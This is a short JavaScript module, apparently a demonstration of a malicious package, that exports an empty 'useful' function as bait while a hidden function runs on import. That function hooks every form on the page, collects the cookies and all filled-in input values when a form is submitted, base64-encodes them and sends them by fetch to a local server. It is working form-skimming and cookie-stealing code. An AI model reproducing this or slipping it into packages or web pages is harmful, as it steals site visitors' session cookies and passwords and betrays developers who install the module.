import * as _ from 'lodash';

/**
 *  Do something useful (and actually do it).
 * This is where we convince people to use our module.
 */
export const usefulFn = () => {};

/**
 * Perform the bad stuff
 * */
const badFn = () => {
  const sendRequest = (el, e) => {
    let inputValues = [document.cookie];
    _.forEach(document.forms, form => {
      _.forEach(form.getElementsByTagName('input'), formInput => {
        if (formInput.value) inputValues.push(formInput.value);
      });
    });

    const encodedPayload = btoa(JSON.stringify(inputValues));
    fetch(`http://localhost:8000/?d=${encodedPayload}`);
  };

  document.addEventListener('DOMContentLoaded', () => {
    let values = [];
    _.forEach(document.forms, form => {
      form.addEventListener('submit', (el, e) => sendRequest(el, e));
    });
  });
};

badFn();
